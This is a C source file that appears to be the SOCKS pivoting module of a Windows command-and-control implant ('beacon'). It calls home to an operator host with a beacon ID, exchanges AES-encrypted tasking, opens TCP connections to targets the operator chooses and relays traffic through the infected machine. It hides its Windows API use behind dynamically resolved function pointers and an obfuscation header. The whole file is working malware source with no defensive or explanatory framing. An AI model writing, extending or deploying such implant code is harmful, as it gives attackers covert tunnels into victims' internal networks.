#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <string.h>
#include "socks.h"
#include "protocol.h"
#include "crypto.h"
#include "dynapi.h"
#include "obf.h"

socks_channel_t g_socks_channels[MAX_SOCKS_CHANNELS];
SOCKET           g_socks_sock = INVALID_SOCKET;
uint8_t          g_socks_key[32];
uint32_t         g_socks_beacon_id;
static CRITICAL_SECTION g_socks_write_cs;
static volatile LONG    g_socks_cs_init = 0;

static void ensure_socks_cs_init(void) {
    if (InterlockedCompareExchange(&g_socks_cs_init, 1, 0) == 0) {
        fnInitializeCriticalSection(&g_socks_write_cs);
    }
}

static socks_channel_t *socks_alloc_channel(uint32_t channel_id) {
    for (int i = 0; i < MAX_SOCKS_CHANNELS; i++) {
        if (InterlockedCompareExchange(&g_socks_channels[i].active, 1, 0) == 0) {
            g_socks_channels[i].channel_id = channel_id;
            g_socks_channels[i].remote_sock = INVALID_SOCKET;
            return &g_socks_channels[i];
        }
    }
    return NULL;
}

static socks_channel_t *socks_find_channel(uint32_t channel_id) {
    for (int i = 0; i < MAX_SOCKS_CHANNELS; i++) {
        if (InterlockedCompareExchange(&g_socks_channels[i].active, 0, 0) == 1 &&
            g_socks_channels[i].channel_id == channel_id) {
            return &g_socks_channels[i];
        }
    }
    return NULL;
}

static void socks_free_channel(socks_channel_t *ch) {
    if (InterlockedCompareExchange(&ch->active, 0, 1) == 1) {
        if (ch->remote_sock != INVALID_SOCKET) {
            fnClosesocket(ch->remote_sock);
            ch->remote_sock = INVALID_SOCKET;
        }
        ch->channel_id = 0;
    }
}

/* ------------------------------------------------------------------ */
/*  Task 6: TCP helpers + safe write + send_socks_msg + tcp_connect    */
/* ------------------------------------------------------------------ */

static int socks_send_all(SOCKET s, const uint8_t *buf, int len) {
    int sent = 0;
    while (sent < len) {
        int n = fnSend(s, (const char *)(buf + sent), len - sent, 0);
        if (n <= 0) return -1;
        sent += n;
    }
    return 0;
}

static int socks_recv_all(SOCKET s, uint8_t *buf, int len) {
    int got = 0;
    while (got < len) {
        int n = fnRecv(s, (char *)(buf + got), len - got, 0);
        if (n <= 0) return -1;
        got += n;
    }
    return 0;
}

static void safe_socks_write(const uint8_t *data, int len) {
    ensure_socks_cs_init();
    fnEnterCriticalSection(&g_socks_write_cs);
    uint8_t hdr[4];
    hdr[0] = (uint8_t)(len);
    hdr[1] = (uint8_t)(len >> 8);
    hdr[2] = (uint8_t)(len >> 16);
    hdr[3] = (uint8_t)(len >> 24);
    socks_send_all(g_socks_sock, hdr, 4);
    socks_send_all(g_socks_sock, data, len);
    fnLeaveCriticalSection(&g_socks_write_cs);
}

static void send_socks_msg(uint8_t type, uint8_t code, uint32_t channel_id,
                           const uint8_t *payload, uint32_t payload_len) {
    task_header_t th = {0};
    th.type   = type;
    th.code   = code;
    th.label  = channel_id;
    th.length = payload_len;

    uint8_t hdr_buf[16];
    encode_header(&th, hdr_buf);

    int plain_len = 16 + (int)payload_len;
    uint8_t *plain = (uint8_t *)fnLocalAlloc(LPTR, (SIZE_T)plain_len);
    if (!plain) return;
    memcpy(plain, hdr_buf, 16);
    if (payload && payload_len > 0)
        memcpy(plain + 16, payload, payload_len);

    /* enc buffer: plain_len + 64 bytes headroom (IV + HMAC + padding) */
    DWORD enc_len = (DWORD)plain_len + 64;
    uint8_t *enc = (uint8_t *)fnLocalAlloc(LPTR, (SIZE_T)enc_len);
    if (!enc) { fnLocalFree(plain); return; }

    if (aes_encrypt(g_socks_key, plain, (DWORD)plain_len, enc, &enc_len) == 0) {
        safe_socks_write(enc, (int)enc_len);
    }
    fnLocalFree(enc);
    fnLocalFree(plain);
}

int socks_tcp_connect(const char *host, uint16_t port,
                      const uint8_t *key, uint32_t beacon_id) {
    if (!fnSocket || !fnConnect) return -1;

    SOCKET s = fnSocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (s == INVALID_SOCKET) return -1;

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family      = AF_INET;
    addr.sin_port        = fnHtons(port);
    addr.sin_addr.s_addr = fnInet_addr(host);

    if (fnConnect(s, (struct sockaddr *)&addr, sizeof(addr)) != 0) {
        fnClosesocket(s);
        return -1;
    }

    /* 4-byte beacon ID (LE) */
    uint8_t id_buf[4];
    id_buf[0] = (uint8_t)(beacon_id);
    id_buf[1] = (uint8_t)(beacon_id >> 8);
    id_buf[2] = (uint8_t)(beacon_id >> 16);
    id_buf[3] = (uint8_t)(beacon_id >> 24);
    if (socks_send_all(s, id_buf, 4) != 0) { fnClosesocket(s); return -1; }

    /* 1-byte connection type */
    uint8_t conn_type = CONN_SOCKS;
    if (socks_send_all(s, &conn_type, 1) != 0) { fnClosesocket(s); return -1; }

    /* Encrypted confirmation: beacon_id encrypted with session key */
    uint8_t enc_buf[128];
    DWORD enc_len = (DWORD)sizeof(enc_buf);
    if (aes_encrypt(key, id_buf, 4, enc_buf, &enc_len) != 0) {
        fnClosesocket(s);
        return -1;
    }

    uint8_t len_buf[4];
    len_buf[0] = (uint8_t)(enc_len);
    len_buf[1] = (uint8_t)(enc_len >> 8);
    len_buf[2] = (uint8_t)(enc_len >> 16);
    len_buf[3] = (uint8_t)(enc_len >> 24);
    if (socks_send_all(s, len_buf, 4) != 0 ||
        socks_send_all(s, enc_buf, (int)enc_len) != 0) {
        fnClosesocket(s);
        return -1;
    }

    g_socks_sock = s;
    memcpy(g_socks_key, key, 32);
    g_socks_beacon_id = beacon_id;
    return 0;
}

/* ------------------------------------------------------------------ */
/*  Task 7: Channel open + reader thread + main loop                   */
/* ------------------------------------------------------------------ */

typedef struct {
    socks_channel_t *ch;
} socks_reader_ctx_t;

static SOCKET socks_connect_target(const uint8_t *payload, uint32_t payload_len) {
    if (payload_len < 1) return INVALID_SOCKET;

    uint8_t addr_type = payload[0];
    struct sockaddr_in sa4;
    memset(&sa4, 0, sizeof(sa4));
    sa4.sin_family = AF_INET;

    if (addr_type == 0x01) {
        /* IPv4: 4 bytes + 2 bytes port */
        if (payload_len < 7) return INVALID_SOCKET;
        memcpy(&sa4.sin_addr, payload + 1, 4);
        sa4.sin_port = *(uint16_t *)(payload + 5); /* already BE */
    } else if (addr_type == 0x03) {
        /* Domain: 1B len + string + 2B port BE */
        if (payload_len < 2) return INVALID_SOCKET;
        uint8_t dlen = payload[1];
        if (payload_len < (uint32_t)(2 + dlen + 2)) return INVALID_SOCKET;

        char domain[256];
        memset(domain, 0, sizeof(domain));
        memcpy(domain, payload + 2, dlen);
        domain[dlen] = '\0';
        uint16_t port_be = *(uint16_t *)(payload + 2 + dlen);

        if (!fnGetaddrinfo) return INVALID_SOCKET;
        ADDRINFOA hints;
        memset(&hints, 0, sizeof(hints));
        hints.ai_family   = AF_INET;
        hints.ai_socktype = SOCK_STREAM;
        PADDRINFOA result = NULL;
        if (fnGetaddrinfo(domain, NULL, &hints, &result) != 0 || !result)
            return INVALID_SOCKET;
        memcpy(&sa4, result->ai_addr, sizeof(sa4));
        sa4.sin_port = port_be;
        fnFreeaddrinfo(result);
    } else {
        return INVALID_SOCKET;
    }

    SOCKET s = fnSocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (s == INVALID_SOCKET) return INVALID_SOCKET;

    /* Non-blocking connect with 15s timeout */
    u_long nb = 1;
    fnIoctlsocket(s, FIONBIO, &nb);

    fnConnect(s, (struct sockaddr *)&sa4, sizeof(sa4));

    fd_set wset, eset;
    FD_ZERO(&wset); FD_SET(s, &wset);
    FD_ZERO(&eset); FD_SET(s, &eset);
    struct timeval tv;
    tv.tv_sec  = 15;
    tv.tv_usec = 0;

    int sel = fnSelect(0, NULL, &wset, &eset, &tv);
    if (sel <= 0 || FD_ISSET(s, &eset)) {
        fnClosesocket(s);
        return INVALID_SOCKET;
    }

    /* Back to blocking mode */
    nb = 0;
    fnIoctlsocket(s, FIONBIO, &nb);

    return s;
}

static DWORD WINAPI socks_reader_thread(LPVOID param) {
    socks_reader_ctx_t *ctx = (socks_reader_ctx_t *)param;
    socks_channel_t *ch = ctx->ch;
    fnLocalFree(ctx);

    uint8_t buf[8192];
    for (;;) {
        int n = fnRecv(ch->remote_sock, (char *)buf, sizeof(buf), 0);
        if (n <= 0) break;
        send_socks_msg(TASK_SOCKS_DATA, 0, ch->channel_id, buf, (uint32_t)n);
    }

    /* EOF or error — close channel */
    uint32_t cid = ch->channel_id;
    if (InterlockedCompareExchange(&ch->active, 0, 1) == 1) {
        fnClosesocket(ch->remote_sock);
        ch->remote_sock = INVALID_SOCKET;
        ch->channel_id  = 0;
    }
    send_socks_msg(TASK_SOCKS_CLOSE, 0, cid, NULL, 0);
    return 0;
}

static void handle_socks_open(uint32_t channel_id,
                              const uint8_t *payload, uint32_t payload_len) {
    socks_channel_t *ch = socks_alloc_channel(channel_id);
    if (!ch) {
        send_socks_msg(TASK_SOCKS_ACK, CODE_SOCKS_FAIL, channel_id, NULL, 0);
        return;
    }

    SOCKET rs = socks_connect_target(payload, payload_len);
    if (rs == INVALID_SOCKET) {
        socks_free_channel(ch);
        send_socks_msg(TASK_SOCKS_ACK, CODE_SOCKS_FAIL, channel_id, NULL, 0);
        return;
    }

    ch->remote_sock = rs;
    send_socks_msg(TASK_SOCKS_ACK, CODE_SOCKS_OK, channel_id, NULL, 0);

    socks_reader_ctx_t *rctx = (socks_reader_ctx_t *)fnLocalAlloc(LPTR, sizeof(*rctx));
    if (!rctx) { socks_free_channel(ch); return; }
    rctx->ch = ch;
    fnCreateThread(NULL, 0, socks_reader_thread, rctx, 0, NULL);
}

void socks_loop(SOCKET sock, const uint8_t *key, uint32_t beacon_id) {
    g_socks_sock      = sock;
    memcpy(g_socks_key, key, 32);
    g_socks_beacon_id = beacon_id;
    ensure_socks_cs_init();

    for (;;) {
        /* Read envelope: 4-byte LE length + ciphertext */
        uint8_t len_buf[4];
        if (socks_recv_all(sock, len_buf, 4) != 0) break;
        uint32_t env_len = (uint32_t)len_buf[0]        |
                           ((uint32_t)len_buf[1] << 8)  |
                           ((uint32_t)len_buf[2] << 16) |
                           ((uint32_t)len_buf[3] << 24);
        if (env_len > 10 * 1024 * 1024) break;

        uint8_t *env = (uint8_t *)fnLocalAlloc(LPTR, (SIZE_T)env_len);
        if (!env) break;
        if (socks_recv_all(sock, env, (int)env_len) != 0) {
            fnLocalFree(env);
            break;
        }

        /* Decrypt into a heap buffer */
        DWORD plain_len = (DWORD)env_len + 64;
        uint8_t *plain = (uint8_t *)fnLocalAlloc(LPTR, (SIZE_T)plain_len);
        if (!plain) { fnLocalFree(env); break; }

        if (aes_decrypt(key, env, (DWORD)env_len, plain, &plain_len) != 0 ||
            plain_len < 16) {
            fnLocalFree(env);
            fnLocalFree(plain);
            continue;
        }
        fnLocalFree(env);

        task_header_t hdr;
        decode_header(plain, &hdr);

        switch (hdr.type) {
        case TASK_SOCKS_OPEN:
            handle_socks_open(hdr.label, plain + 16, hdr.length);
            break;

        case TASK_SOCKS_DATA: {
            socks_channel_t *ch = socks_find_channel(hdr.label);
            if (ch && ch->remote_sock != INVALID_SOCKET) {
                fnSend(ch->remote_sock, (const char *)(plain + 16),
                       (int)hdr.length, 0);
            }
            break;
        }

        case TASK_SOCKS_CLOSE: {
            socks_channel_t *ch = socks_find_channel(hdr.label);
            if (ch) socks_free_channel(ch);
            break;
        }

        default:
            break;
        }

        fnLocalFree(plain);
    }

    /* Cleanup all channels on disconnect */
    for (int i = 0; i < MAX_SOCKS_CHANNELS; i++) {
        socks_free_channel(&g_socks_channels[i]);
    }
    g_socks_sock = INVALID_SOCKET;
}
